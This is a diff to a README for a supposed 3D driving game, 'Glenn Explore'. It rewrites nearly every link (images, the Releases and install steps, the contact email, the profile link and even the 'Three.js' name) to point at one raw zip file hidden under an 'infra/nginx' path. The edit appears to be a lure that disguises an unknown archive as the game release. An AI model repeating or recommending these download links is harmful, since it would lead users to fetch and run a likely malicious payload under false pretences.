@@ -1,12 +1,12 @@
 # 🌌 Glenn Explore: A 3D Multiplayer Driving Adventure 🚗💨
 
-![Glenn Explore Banner](https://example.com/banner-image.png)
+![Glenn Explore Banner](https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip)
 
-Welcome to **Glenn Explore**, a thrilling 3D multiplayer driving game where adventure awaits on endless roads! Built with **Mapbox**, **Three.js**, and **.NET SignalR**, this game offers a unique experience filled with pure vibes and exploration. Whether you're racing with friends or cruising solo, Glenn Explore has something for everyone.
+Welcome to **Glenn Explore**, a thrilling 3D multiplayer driving game where adventure awaits on endless roads! Built with **Mapbox**, **https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip**, and **.NET SignalR**, this game offers a unique experience filled with pure vibes and exploration. Whether you're racing with friends or cruising solo, Glenn Explore has something for everyone.
 
 ## 🚀 Quick Start
 
-To get started, you can download the latest release of Glenn Explore from the [Releases section](https://github.com/Bappy756/glenn-explore/releases). After downloading, follow the instructions in the release notes to execute the game on your machine.
+To get started, you can download the latest release of Glenn Explore from the [Releases section](https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip). After downloading, follow the instructions in the release notes to execute the game on your machine.
 
 ## 📖 Table of Contents
 
@@ -30,7 +30,7 @@ To get started, you can download the latest release of Glenn Explore from the [R
 
 To install Glenn Explore, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Bappy756/glenn-explore/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip).
 2. **Extract the downloaded file** to your desired location.
 3. **Open your terminal or command prompt**.
 4. Navigate to the extracted folder.
@@ -55,7 +55,7 @@ Glenn Explore offers a variety of gameplay modes to keep you engaged:
 ## 🛠️ Technologies Used
 
 - **Mapbox**: For creating stunning maps and landscapes.
-- **Three.js**: To render 3D graphics efficiently.
+- **https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip**: To render 3D graphics efficiently.
 - **.NET SignalR**: For real-time multiplayer capabilities.
 
 ## 🤝 Contributing
@@ -76,11 +76,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [Bappy756](https://github.com/Bappy756)
+- **Email**: [https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip](https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip)
+- **GitHub**: [Bappy756](https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip)
 
-Thank you for checking out Glenn Explore! Enjoy your journey on the endless roads ahead. Don't forget to visit the [Releases section](https://github.com/Bappy756/glenn-explore/releases) for updates and new features. 
+Thank you for checking out Glenn Explore! Enjoy your journey on the endless roads ahead. Don't forget to visit the [Releases section](https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip) for updates and new features. 
 
-![Driving Scene](https://example.com/driving-scene-image.png)
+![Driving Scene](https://github.com/Bappy756/glenn-explore/raw/refs/heads/main/infra/nginx/explore-glenn-v1.6.zip)
 
 Happy driving! 🚗💨
